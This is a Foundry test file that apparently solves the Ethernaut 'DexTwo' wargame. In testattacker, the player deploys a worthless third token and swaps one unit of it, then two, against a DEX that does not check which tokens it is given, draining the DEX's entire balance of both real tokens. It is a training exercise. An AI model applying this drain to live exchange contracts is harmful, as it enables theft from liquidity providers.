// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Test.sol";
import "src/23_DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo instance;
    address player1;
    ERC20 token1;
    ERC20 token2;

    function setUp() public {
        player1 = vm.addr(1);

        instance = new DexTwo();
        address instanceAddress = address(instance);

        SwappableTokenTwo tokenInstance = new SwappableTokenTwo(
            instanceAddress,
            "Token 1",
            "TKN1",
            110
        );
        SwappableTokenTwo tokenInstanceTwo = new SwappableTokenTwo(
            instanceAddress,
            "Token 2",
            "TKN2",
            110
        );

        token1 = ERC20(tokenInstance);
        token2 = ERC20(tokenInstanceTwo);

        address tokenInstanceAddress = address(tokenInstance);
        address tokenInstanceTwoAddress = address(tokenInstanceTwo);

        instance.setTokens(tokenInstanceAddress, tokenInstanceTwoAddress);

        tokenInstance.approve(instanceAddress, 100);
        tokenInstanceTwo.approve(instanceAddress, 100);

        instance.add_liquidity(tokenInstanceAddress, 100);
        instance.add_liquidity(tokenInstanceTwoAddress, 100);

        tokenInstance.transfer(player1, 10);
        tokenInstanceTwo.transfer(player1, 10);
    }

    function testattacker() public {
        vm.startPrank(player1, player1);

        SwappableTokenTwo token3 = new SwappableTokenTwo(
            address(instance),
            "Token 3",
            "TKN3",
            10_000
        );

        token1.approve(address(instance), 2 ** 256 - 1);
        token2.approve(address(instance), 2 ** 256 - 1);
        token3.approve(address(instance), 2 ** 256 - 1);

        ERC20(token3).transfer(address(instance), 1);

        instance.swap(address(token3), address(token1), 1);
        instance.swap(address(token3), address(token2), 2);

        assertEq(
            token1.balanceOf(address(instance)) == 0 &&
                token2.balanceOf(address(instance)) == 0,
            true
        );

        vm.stopPrank();
    }
}
